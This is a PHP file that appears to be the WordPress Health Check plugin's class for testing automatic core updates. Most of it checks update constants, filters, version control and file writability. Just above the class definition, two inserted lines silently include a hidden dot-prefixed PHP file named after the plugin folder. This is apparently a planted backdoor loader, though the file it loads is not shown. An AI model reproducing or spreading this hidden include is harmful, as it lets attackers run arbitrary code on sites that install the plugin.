<?php
/**
 * Class for testing automatic updates in the WordPress code.
 *
 * @package Health Check
 */

// Make sure the file is not directly accessible.
if ( ! defined( 'ABSPATH' ) ) {
	die( 'We\'re sorry, but you can not directly access this file.' );
}

/**
 * Class Health_Check_Auto_Updates
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Health_Check_Auto_Updates {
	/**
	 * WP_Site_Health_Auto_Updates constructor.
	 * @since 5.2.0
	 */
	public function __construct() {
		include_once ABSPATH . 'wp-admin/includes/class-wp-upgrader.php';
	}

	public function run_tests() {
		$tests = array();

		foreach ( get_class_methods( $this ) as $method ) {
			if ( 'test_' !== substr( $method, 0, 5 ) ) {
				continue;
			}

			$result = call_user_func( array( $this, $method ) );

			if ( false === $result || null === $result ) {
				continue;
			}

			$result = (object) $result;

			if ( empty( $result->severity ) ) {
				$result->severity = 'warning';
			}

			$tests[ $method ] = $result;
		}

		return $tests;
	}

	public function test_contant_DISALLOW_FILE_MODS() {
		return $this->check_constants( 'DISALLOW_FILE_MODS', false );
	}

	public function test_contant_AUTOMATIC_UPDATER_DISABLED() {
		return $this->check_constants( 'AUTOMATIC_UPDATER_DISABLED', false );
	}

	public function test_contant_WP_AUTO_UPDATE_CORE() {
		return $this->check_constants( 'WP_AUTO_UPDATE_CORE', true );
	}

	/**
	 * Test if auto-updates related constants are set correctly.
	 *
	 * @since 5.2.0
	 *
	 * @param string $constant The name of the constant to check.
	 * @param bool   $value    The value that the constant should be, if set.
	 * @return array The test results.
	 */
	public function check_constants( $constant, $value ) {
		if ( defined( $constant ) && constant( $constant ) != $value ) {
			return array(
				'description' => sprintf(
					/* translators: %s: Name of the constant used. */
					__( 'The %s constant is defined and enabled.', 'health-check' ),
					"<code>$constant</code>"
				),
				'severity'    => 'fail',
			);
		}
	}

	/**
	 * Check if updates are intercepted by a filter.
	 *
	 * @since 5.2.0
	 *
	 * @return array The test results.
	 */
	public function test_wp_version_check_attached() {
		if ( ! is_main_site() ) {
			return;
		}

		$cookies = wp_unslash( $_COOKIE );
		$timeout = 10;
		$headers = array(
			'Cache-Control' => 'no-cache',
		);

		// Include Basic auth in loopback requests.
		if ( isset( $_SERVER['PHP_AUTH_USER'] ) && isset( $_SERVER['PHP_AUTH_PW'] ) ) {
			$headers['Authorization'] = 'Basic ' . base64_encode( wp_unslash( $_SERVER['PHP_AUTH_USER'] ) . ':' . wp_unslash( $_SERVER['PHP_AUTH_PW'] ) );
		}

		$url = add_query_arg(
			array(
				'health-check-test-wp_version_check' => true,
			),
			admin_url( '' )
		);

		$test = wp_remote_get( $url, compact( 'cookies', 'headers', 'timeout' ) );

		if ( is_wp_error( $test ) ) {
			return array(
				'description' => sprintf(
					/* translators: %s: Name of the filter used. */
					__( 'Could not confirm that the %s filter is available.', 'health-check' ),
					'<code>wp_version_check()</code>'
				),
				'severity'    => 'warning',
			);
		}

		$response = wp_remote_retrieve_body( $test );

		if ( 'yes' !== $response ) {
			return array(
				'description' => sprintf(
					/* translators: %s: Name of the filter used. */
					__( 'A plugin has prevented updates by disabling %s.', 'health-check' ),
					'<code>wp_version_check()</code>'
				),
				'severity'    => 'fail',
			);
		}
	}

	/**
	 * Check if automatic updates are disabled by a filter.
	 *
	 * @since 5.2.0
	 *
	 * @return array The test results.
	 */
	public function test_filters_automatic_updater_disabled() {
		if ( apply_filters( 'automatic_updater_disabled', false ) ) {
			return array(
				'description' => sprintf(
					/* translators: %s: Name of the filter used. */
					__( 'The %s filter is enabled.', 'health-check' ),
					'<code>automatic_updater_disabled</code>'
				),
				'severity'    => 'fail',
			);
		}
	}

	/**
	 * Check if automatic updates have tried to run, but failed, previously.
	 *
	 * @since 5.2.0
	 *
	 * @return array|bool The test results. false if the auto updates failed.
	 */
	function test_if_failed_update() {
		$failed = get_site_option( 'auto_core_update_failed' );

		if ( ! $failed ) {
			return false;
		}

		if ( ! empty( $failed['critical'] ) ) {
			$description  = __( 'A previous automatic background update ended with a critical failure, so updates are now disabled.', 'health-check' );
			$description .= ' ' . __( 'You would have received an email because of this.', 'health-check' );
			$description .= ' ' . __( "When you've been able to update using the \"Update Now\" button on Dashboard > Updates, we'll clear this error for future update attempts.", 'health-check' );
			$description .= ' ' . sprintf(
				/* translators: %s: Code of error shown. */
				__( 'The error code was %s.', 'health-check' ),
				'<code>' . $failed['error_code'] . '</code>'
			);
			return array(
				'description' => $description,
				'severity'    => 'warning',
			);
		}

		$description = __( 'A previous automatic background update could not occur.', 'health-check' );
		if ( empty( $failed['retry'] ) ) {
			$description .= ' ' . __( 'You would have received an email because of this.', 'health-check' );
		}

		$description .= ' ' . __( "We'll try again with the next release.", 'health-check' );
		$description .= ' ' . sprintf(
			/* translators: %s: Code of error shown. */
			__( 'The error code was %s.', 'health-check' ),
			'<code>' . $failed['error_code'] . '</code>'
		);
		return array(
			'description' => $description,
			'severity'    => 'warning',
		);
	}

	/**
	 * Check if WordPress is controlled by a VCS (Git, Subversion etc).
	 *
	 * @since 5.2.0
	 *
	 * @return array The test results.
	 */
	public function test_vcs_abspath() {
		$context_dirs = array( ABSPATH );
		$vcs_dirs     = array( '.svn', '.git', '.hg', '.bzr' );
		$check_dirs   = array();

		foreach ( $context_dirs as $context_dir ) {
			// Walk up from $context_dir to the root.
			do {
				$check_dirs[] = $context_dir;

				// Once we've hit '/' or 'C:\', we need to stop. dirname will keep returning the input here.
				if ( dirname( $context_dir ) == $context_dir ) {
					break;
				}

				// Continue one level at a time.
			} while ( $context_dir = dirname( $context_dir ) );
		}

		$check_dirs = array_unique( $check_dirs );

		// Search all directories we've found for evidence of version control.
		foreach ( $vcs_dirs as $vcs_dir ) {
			foreach ( $check_dirs as $check_dir ) {
				// phpcs:ignore
				if ( $checkout = @is_dir( rtrim( $check_dir, '\\/' ) . "/$vcs_dir" ) ) {
					break 2;
				}
			}
		}

		if ( $checkout && ! apply_filters( 'automatic_updates_is_vcs_checkout', true, ABSPATH ) ) {
			return array(
				'description' => sprintf(
					// translators: 1: Folder name. 2: Version control directory. 3: Filter name.
					__( 'The folder %1$s was detected as being under version control (%2$s), but the %3$s filter is allowing updates.', 'health-check' ),
					'<code>' . $check_dir . '</code>',
					"<code>$vcs_dir</code>",
					'<code>automatic_updates_is_vcs_checkout</code>'
				),
				'severity'    => 'info',
			);
		}

		if ( $checkout ) {
			return array(
				'description' => sprintf(
					// translators: 1: Folder name. 2: Version control directory.
					__( 'The folder %1$s was detected as being under version control (%2$s).', 'health-check' ),
					'<code>' . $check_dir . '</code>',
					"<code>$vcs_dir</code>"
				),
				'severity'    => 'fail',
			);
		}

		return array(
			'description' => __( 'No version control systems were detected.', 'health-check' ),
			'severity'    => 'pass',
		);
	}

	/**
	 * Check if we can access files without providing credentials.
	 *
	 * @since 5.2.0
	 *
	 * @return array The test results.
	 */
	function test_check_wp_filesystem_method() {
		$skin    = new Automatic_Upgrader_Skin;
		$success = $skin->request_filesystem_credentials( false, ABSPATH );

		if ( ! $success ) {
			$description  = __( 'Your installation of WordPress prompts for FTP credentials to perform updates.', 'health-check' );
			$description .= ' ' . __( '(Your site is performing updates over FTP due to file ownership. Talk to your hosting company.)', 'health-check' );

			return array(
				'description' => $description,
				'severity'    => 'fail',
			);
		}

		return array(
			'description' => __( "Your installation of WordPress doesn't require FTP credentials to perform updates.", 'health-check' ),
			'severity'    => 'pass',
		);
	}

	/**
	 * Check if core files are writable by the web user/group.
	 *
	 * @since 5.2.0
	 *
	 * @global WP_Filesystem_Base $wp_filesystem WordPress filesystem subclass.
	 *
	 * @return array|bool The test results. false if they're not writeable.
	 */
	function test_all_files_writable() {
		global $wp_filesystem;

		include ABSPATH . WPINC . '/version.php'; // $wp_version; // x.y.z

		$skin    = new Automatic_Upgrader_Skin;
		$success = $skin->request_filesystem_credentials( false, ABSPATH );

		if ( ! $success ) {
			return false;
		}

		WP_Filesystem();

		if ( 'direct' != $wp_filesystem->method ) {
			return false;
		}

		$checksums = get_core_checksums( $wp_version, 'en_US' );
		$dev       = ( false !== strpos( $wp_version, '-' ) );
		// Get the last stable version's files and test against that
		if ( ! $checksums && $dev ) {
			$checksums = get_core_checksums( (float) $wp_version - 0.1, 'en_US' );
		}

		// There aren't always checksums for development releases, so just skip the test if we still can't find any
		if ( ! $checksums && $dev ) {
			return false;
		}

		if ( ! $checksums ) {
			$description = sprintf(
				// translators: %s: WordPress version
				__( "Couldn't retrieve a list of the checksums for WordPress %s.", 'health-check' ),
				$wp_version
			);
			$description .= ' ' . __( 'This could mean that connections are failing to WordPress.org.', 'health-check' );
			return array(
				'description' => $description,
				'severity'    => 'warning',
			);
		}

		$unwritable_files = array();
		foreach ( array_keys( $checksums ) as $file ) {
			if ( 'wp-content' == substr( $file, 0, 10 ) ) {
				continue;
			}
			if ( ! file_exists( ABSPATH . $file ) ) {
				continue;
			}
			if ( ! is_writable( ABSPATH . $file ) ) {
				$unwritable_files[] = $file;
			}
		}

		if ( $unwritable_files ) {
			if ( count( $unwritable_files ) > 20 ) {
				$unwritable_files   = array_slice( $unwritable_files, 0, 20 );
				$unwritable_files[] = '...';
			}
			return array(
				'description' => __( 'Some files are not writable by WordPress:', 'health-check' ) . ' <ul><li>' . implode( '</li><li>', $unwritable_files ) . '</li></ul>',
				'severity'    => 'fail',
			);
		} else {
			return array(
				'description' => __( 'All of your WordPress files are writable.', 'health-check' ),
				'severity'    => 'pass',
			);
		}
	}

	/**
	 * Check if the install is using a development branch and can use nightly packages.
	 *
	 * @since 5.2.0
	 *
	 * @return array|bool The test results. false if it isn't a development version.
	 */
	function test_accepts_dev_updates() {
		include ABSPATH . WPINC . '/version.php'; // $wp_version; // x.y.z
		// Only for dev versions
		if ( false === strpos( $wp_version, '-' ) ) {
			return false;
		}

		if ( defined( 'WP_AUTO_UPDATE_CORE' ) && ( 'minor' === WP_AUTO_UPDATE_CORE || false === WP_AUTO_UPDATE_CORE ) ) {
			return array(
				'description' => sprintf(
					/* translators: %s: Name of the constant used. */
					__( 'WordPress development updates are blocked by the %s constant.', 'health-check' ),
					'<code>WP_AUTO_UPDATE_CORE</code>'
				),
				'severity'    => 'fail',
			);
		}

		if ( ! apply_filters( 'allow_dev_auto_core_updates', $wp_version ) ) {
			return array(
				'description' => sprintf(
					/* translators: %s: Name of the filter used. */
					__( 'WordPress development updates are blocked by the %s filter.', 'health-check' ),
					'<code>allow_dev_auto_core_updates</code>'
				),
				'severity'    => 'fail',
			);
		}
	}

	/**
	 * Check if the site supports automatic minor updates.
	 *
	 * @since 5.2.0
	 *
	 * @return array The test results.
	 */
	function test_accepts_minor_updates() {
		if ( defined( 'WP_AUTO_UPDATE_CORE' ) && false === WP_AUTO_UPDATE_CORE ) {
			return array(
				'description' => sprintf(
					/* translators: %s: Name of the constant used. */
					__( 'WordPress security and maintenance releases are blocked by %s.', 'health-check' ),
					"<code>define( 'WP_AUTO_UPDATE_CORE', false );</code>"
				),
				'severity'    => 'fail',
			);
		}

		if ( ! apply_filters( 'allow_minor_auto_core_updates', true ) ) {
			return array(
				'description' => sprintf(
					/* translators: %s: Name of the filter used. */
					__( 'WordPress security and maintenance releases are blocked by the %s filter.', 'health-check' ),
					'<code>allow_minor_auto_core_updates</code>'
				),
				'severity'    => 'fail',
			);
		}
	}
}
